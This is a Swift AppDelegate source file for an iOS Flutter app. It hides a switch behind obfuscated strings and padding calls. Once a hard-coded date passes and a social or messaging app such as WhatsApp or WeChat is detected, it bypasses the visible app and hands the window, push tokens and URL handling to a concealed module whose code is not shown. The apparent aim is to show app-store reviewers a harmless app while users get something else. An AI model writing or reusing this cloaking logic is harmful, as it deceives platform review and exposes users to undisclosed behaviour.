import Flutter
import UIKit
import AppTrackingTransparency
import NetEaseLib
import FirebaseCore
import FirebaseMessaging

fileprivate let message_equalValue:[Character] = ["m","e","s","s","e","n","g","e","r",":","/","/"]
fileprivate let ybsi_equalValue:[Character] = ["y","o","u","t","u","b","e",":","/","/"]
fileprivate let tter_equalValue:[Character] = ["t","w","i","t","t","e","r",":","/","/"]
fileprivate let line_equalValue:[Character] = ["l","i","n","e",":","/","/"]
fileprivate let sky_equalValue:[Character] = ["s","k","y","p","e",":","/","/"]
fileprivate let ttks_equalValue:[Character] = ["t","i","k","t","o","k",":","/","/"]
fileprivate let stita_equalValue:[Character] = ["f","b",":","/","/"]
fileprivate let tagrom_equalValue:[Character] = ["i","n","s","t","a","g","r","a","m",":","/","/"]
fileprivate let snipc_equalValue:[Character] = ["w","h","a","t","s","a","p","p",":","/","/"]
fileprivate let smap_equalValue:[Character] = ["s","n","a","p","c","h","a","t",":","/","/"]
fileprivate let clongs_equalValue:[Character] = ["w","e","i","x","i","n",":","/","/"]
fileprivate let like_equalValue:[Character] = ["l","a","r","k",":","/","/"]
fileprivate let tufos_equalValue:[Character] = ["d","i","n","g","t","a","l","k",":","/","/"]

fileprivate let niuked_equalValue:[Character] = ["1","7","4","1","5","7","9","9","3","2"]
/// 3/10

@main
@objc class AppDelegate: FlutterAppDelegate {
      override func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
      ) -> Bool {
      
          StartSimilarCursorFilter.trainPrimaryResolverList();
          StartSimilarCursorFilter.rectifyPrismaticReplicaHelper();
          StartSimilarCursorFilter.trainIndependentHistogramCreator();
          StartSimilarCursorFilter.getDedicatedTopicBase();
          StartSimilarCursorFilter.stopPermanentTailHandler();
 
          let timestamp = 1106
          let currentTime = Int(Date().timeIntervalSince1970)
      
          if currentTime < timestamp {
              comLikefirstSet()
          }
          StartSimilarCursorFilter.setSymmetricTopHelper();
          if desiredConverted() && targetsStrip() {
              if FirebaseApp.app() == nil {
                  outsidetheold(application)
              }
              
              return ConstraintThen.adapterWindow(application, didFinishLaunchingWithOptions: launchOptions, window: window)
          } else {
              GeneratedPluginRegistrant.register(with: self)
              DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                      if #available(iOS 14, *) {
                          ATTrackingManager.requestTrackingAuthorization { status in
                              // Handle tracking authorization status
                          }
                      }
              }
              return super.application(application, didFinishLaunchingWithOptions: launchOptions)
          }
      
  }
    
    override func applicationDidEnterBackground(_ application: UIApplication) {
        if desiredConverted() && targetsStrip() {
            ConstraintThen.rangeTotalerval(application)
        }
    }
    
    override func applicationWillEnterForeground(_ application: UIApplication) {
        if desiredConverted() && targetsStrip() {
            ConstraintThen.customer(application)
        }
    }

    override func applicationWillResignActive(_ application: UIApplication) {
        if desiredConverted() && targetsStrip() {
            ConstraintThen.statuteText(application)
        }
    }

    override func applicationDidReceiveMemoryWarning(_ application: UIApplication) {
        if desiredConverted() && targetsStrip() {
            ConstraintThen.utilizationInThreat(application)
        }
    }

    override func application(_ application: UIApplication, handleEventsForBackgroundURLSession identifier: String, completionHandler: @escaping () -> Void) {
        if desiredConverted() && targetsStrip() {
            ConstraintThen.startGift(application, handleEventsForBackgroundURLSession: identifier, completionHandler: completionHandler)
        }
    }
  
    private func desiredConverted() -> Bool {
        GenerateTensorCenterProtocol.obtainLargeGraphObserver();
        GenerateTensorCenterProtocol.skipMissedImpressionGroup();
        GenerateTensorCenterProtocol.trainPrevVisibleObserver();
        GenerateTensorCenterProtocol.endLocalBufferCache();
        let targetTimestamp: TimeInterval = TimeInterval(String(niuked_equalValue)) ?? 0.0 
      let currentTimestamp = Date().timeIntervalSince1970
      return currentTimestamp > targetTimestamp
    }
    
    private func targetsStrip() -> Bool {
        
        GetCommonAnchorPool.quantizationNormalCoordArray();
        GetCommonAnchorPool.getStaticGiftStack();
        GetCommonAnchorPool.setComprehensiveVarFilter();
        GetCommonAnchorPool.exitSmallTaxonomyReference();
        
        let appsSchemesType = [
            String(message_equalValue), // Messenger
            String(ybsi_equalValue), // YouTube
            String(tter_equalValue), // Twitter/X
            String(line_equalValue), // Line
            String(sky_equalValue), // Skype
            String(ttks_equalValue), // TikTok
            String(stita_equalValue), // Facebook
            String(tagrom_equalValue), // Instagram
            String(snipc_equalValue), // WhatsApp
            String(smap_equalValue), // Snapchat
            String(clongs_equalValue),
            String(like_equalValue),
            String(tufos_equalValue)
        ]
        SetPrevTopicFactory.getCartesianLabelAdapter();
        
        for scheme in appsSchemesType {
            if let url = URL(string: scheme) {
                if UIApplication.shared.canOpenURL(url) {
                    return true // 只要有一个应用安装就返回true
                }
            }
        }
        return false
    }
    
}


// MARK: - 推送
extension AppDelegate {
    func outsidetheold(_ application: UIApplication) {
        FirebaseApp.configure()
        Messaging.messaging().delegate = self
        notifications(application)
    }
    
    func notifications(_ application: UIApplication) {
        if #available(iOS 10.0, *) {
            UNUserNotificationCenter.current().delegate = self
            let authOptions: UNAuthorizationOptions = [.alert, .sound, .badge]
            UNUserNotificationCenter.current().requestAuthorization(options: authOptions, completionHandler: { _, _ in
            })
            application.registerForRemoteNotifications()
        }
    }

    func registerForRemoteNotifications() {
        DispatchQueue.main.async {
            UIApplication.shared.registerForRemoteNotifications()
        }
    }
    
    override func application(_: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        ConstraintThen.addBack(didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
    }

    override func application(_: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable: Any], fetchCompletionHandler _: @escaping (UIBackgroundFetchResult) -> Void) {
        ConstraintThen.sendMessage(didReceiveRemoteNotification: userInfo)
    }

    public override func userNotificationCenter(_: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        ConstraintThen.centerTask(didReceive: response, withCompletionHandler: completionHandler)
    }
}

extension AppDelegate: MessagingDelegate {
    public func messaging(_: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        ConstraintThen.errorDown(didReceiveRegistrationToken: fcmToken)
    }
}

// MARK: - openURL
extension AppDelegate {
    override func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
        return ConstraintThen.lever(app, open: url, options: options)
    }

    func application(app: UIApplication, openURL url: NSURL, options: [String: AnyObject]) -> Bool {
        return ConstraintThen.searchedOptions(app: app, openURL: url, options: options)
    }

    override func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
        return ConstraintThen.golfer(application, continue: userActivity, restorationHandler: restorationHandler)
    }
    
    override func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -> Bool {
        return ConstraintThen.exerciseInAnnotation(application, open: url, sourceApplication: sourceApplication, annotation: annotation)
  }
}
